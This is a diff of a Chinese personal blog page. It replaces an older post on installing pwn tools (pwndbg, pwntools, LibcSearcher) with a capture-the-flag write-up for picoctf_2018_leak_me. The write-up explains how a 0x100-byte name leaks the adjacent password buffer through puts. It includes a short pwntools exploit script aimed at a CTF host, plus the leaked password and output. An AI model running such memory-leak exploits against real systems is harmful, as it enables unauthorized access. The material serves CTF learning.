@@ -6,19 +6,34 @@
   <meta http-equiv="cache-control" content="no-cache">
   <meta http-equiv="expires" content="0">
   
-  <title>pwn题环境 | winter - 像初雪一样自由洒落</title>
+  <title>picoctf_2018_leak_me详解 | winter - 像初雪一样自由洒落</title>
   <meta name="author" content="winter">
   
-  <meta name="description" content="呃，，，总是弄炸环境，，，，还忘记快照，，，，
+  <meta name="description" content="虽然很简单，但好像第一次碰见这样的题，所以记录下。
 
-1.pwngdb123git clone https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;pwndbg&amp;#x2F;pwndbgcd pwndbg.&amp;#x2F;setup.sh
+反汇编问题问题：main函数f5的时候报如下错误
 
-2.pip1sudo apt install pyt">
+解决：
+
+找到报错的地址：0x8048705【按g输入地址即可】
+
+
+双击函数，然后f5
+
+
+然后就可以正常了
+
+
+程序流程
+输入name
+打印name
+输入password
+比较输入passw">
   
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
-  <meta property="og:title" content="pwn题环境"/>
+  <meta property="og:title" content="picoctf_2018_leak_me详解"/>
   <meta property="og:site_name" content="winter - 像初雪一样自由洒落"/>
 
   
@@ -122,7 +137,7 @@ var _hmt = _hmt || [];
 
 	
 		<div class="page-header">
-			<h1> pwn题环境</h1>
+			<h1> picoctf_2018_leak_me详解</h1>
 		</div>
 	
 
@@ -140,23 +155,40 @@ var _hmt = _hmt || [];
 	  		
 
 	  <blockquote>
-<p>呃，，，总是弄炸环境，，，，还忘记快照，，，，</p>
+<p>虽然很简单，<del>但好像第一次碰见这样的题</del>，所以记录下。</p>
 </blockquote>
-<h2 id="1-pwngdb"><a href="#1-pwngdb" class="headerlink" title="1.pwngdb"></a>1.pwngdb</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;pwndbg&#x2F;pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">.&#x2F;setup.sh</span><br></pre></td></tr></table></figure>
+<h3 id="反汇编问题"><a href="#反汇编问题" class="headerlink" title="反汇编问题"></a>反汇编问题</h3><p>问题：main函数f5的时候报如下错误</p>
+<p><img src="/2021/05/01/picoctf-2018-leak-me%E8%AF%A6%E8%A7%A3/image-20210501234336628.png" alt="image-20210501234336628"></p>
+<p>解决：</p>
+<ol>
+<li><p>找到报错的地址：0x8048705【按g输入地址即可】</p>
+<p><img src="/2021/05/01/picoctf-2018-leak-me%E8%AF%A6%E8%A7%A3/image-20210501234523311.png" alt="image-20210501234523311"></p>
+</li>
+<li><p>双击函数，然后f5</p>
+<p><img src="/2021/05/01/picoctf-2018-leak-me%E8%AF%A6%E8%A7%A3/image-20210501234614572.png" alt="image-20210501234614572"></p>
+</li>
+<li><p>然后就可以正常了</p>
+</li>
+</ol>
+<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><ol>
+<li>输入name</li>
+<li>打印name</li>
+<li>输入password</li>
+<li>比较输入password和password</li>
+<li>相同打印flag</li>
+</ol>
+<p><img src="/2021/05/01/picoctf-2018-leak-me%E8%AF%A6%E8%A7%A3/image-20210501234815805.png" alt="image-20210501234815805"></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>由于name和password是紧挨着的，而且差距0x100。</p>
+<p>如果name的长度为0x100，那么puts输出name的时候，就会把password一起带出来了。</p>
+<p>而且name的最大长度可以达到0x100，故首先令name=0x100，即可泄露password，接着就可以得到flag了。</p>
+<p><img src="/2021/05/01/picoctf-2018-leak-me%E8%AF%A6%E8%A7%A3/image-20210501234915134.png" alt="image-20210501234915134"></p>
+<h4 id="获得password"><a href="#获得password" class="headerlink" title="获得password"></a>获得password</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,26105)</span><br><span class="line">p.recvuntil(&quot;name?&quot;)</span><br><span class="line">p.sendline(&quot;a&quot;*0x100)</span><br><span class="line"># password &#x3D; &quot;a_reAllY_s3cuRe_p4s$word_f85406&quot;</span><br><span class="line"># p.sendline(password)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<h2 id="2-pip"><a href="#2-pip" class="headerlink" title="2.pip"></a>2.pip</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python-pip</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line">Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,a_reAllY_s3cuRe_p4s$word_f85406</span><br><span class="line"></span><br><span class="line">Incorrect Password!</span><br></pre></td></tr></table></figure>
 
-<h2 id="3-pwntools"><a href="#3-pwntools" class="headerlink" title="3.pwntools"></a>3.pwntools</h2><p><a href="https://www.cnblogs.com/pcat/p/5451780.html" target="_blank" rel="noopener">pwntools安装使用方法</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pwntools</span><br></pre></td></tr></table></figure>
+<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26105</span>)</span><br><span class="line">p.recvuntil(<span class="string">"name?"</span>)</span><br><span class="line">p.sendline(<span class="string">"a"</span>*<span class="number">0x100</span>)</span><br><span class="line"><span class="comment"># password = "a_reAllY_s3cuRe_p4s$word_f85406"</span></span><br><span class="line"><span class="comment"># p.sendline(password)</span></span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<blockquote>
-<p>如果有vpn的话无所谓，否则最好用清华源，，，</p>
-</blockquote>
-<h2 id="4-LibcSearcher"><a href="#4-LibcSearcher" class="headerlink" title="4.LibcSearcher"></a>4.LibcSearcher</h2><p>github：<a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener">https://github.com/lieanu/LibcSearcher</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;lieanu&#x2F;LibcSearcher.git</span><br><span class="line">cd LibcSearcher</span><br><span class="line">(sudo) python setup.py develop</span><br></pre></td></tr></table></figure>
-
-<h2 id="5-sublime"><a href="#5-sublime" class="headerlink" title="5.sublime"></a>5.sublime</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:webupd8team&#x2F;sublime-text-3</span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install sublime-text-installer</span><br></pre></td></tr></table></figure>
-
+<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="PicoCTF_2018_leak-me">附件</a></p>
 	  
 	</div>
 
@@ -166,13 +198,12 @@ var _hmt = _hmt || [];
 
     
     
-    <a href="/2021/02/25/pwnable-tw-9-16题/" type="button" class="btn btn-default"><i
-                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
     
 
     <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
     
-    <a href="/2021/02/18/编译debug版本的glibc/" type="button" class="btn btn-default ">Next<i
+    <a href="/2021/05/01/gyctf-2020-some-thing-exceting详解/" type="button" class="btn btn-default ">Next<i
                 class="fa fa-arrow-circle-o-right"></i></a>
     
 
@@ -201,43 +232,18 @@ var _hmt = _hmt || [];
 	
 	<div class="meta-widget">
 	<i class="fa fa-clock-o"></i>
-	2021-02-18 
+	2021-05-01 
 	</div>
 	
 
 	<!-- categories -->
     
-	<div class="meta-widget">
-	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
-    <ul id="categorys" class="tag_box list-unstyled collapse in">
-          
-  <li>
-    <li><a href="/categories/pwn/">pwn<span>9</span></a></li>
-  </li>
-
-    </ul>
-	</div>
-	
 
 	<!-- tags -->
-	
-	<div class="meta-widget">
-	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
-    <ul id="tags" class="tag_box list-unstyled collapse in">	  
-	    
-  <li><a href="/tags/基础知识/">基础知识<span>4</span></a></li>
-    </ul>
-	</div>
 		
 
 	<!-- toc -->
 	<div class="meta-widget">
-	
-	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
-	   <div id="toc" class="toc collapse in">
-		   <span class="toc-title">Contents</span>
-			<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#1-pwngdb"><span class="toc-article-text">1.pwngdb</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#2-pip"><span class="toc-article-text">2.pip</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#3-pwntools"><span class="toc-article-text">3.pwntools</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#4-LibcSearcher"><span class="toc-article-text">4.LibcSearcher</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#5-sublime"><span class="toc-article-text">5.sublime</span></a></li></ol>
-		</div>
 	
 	</div>
 	
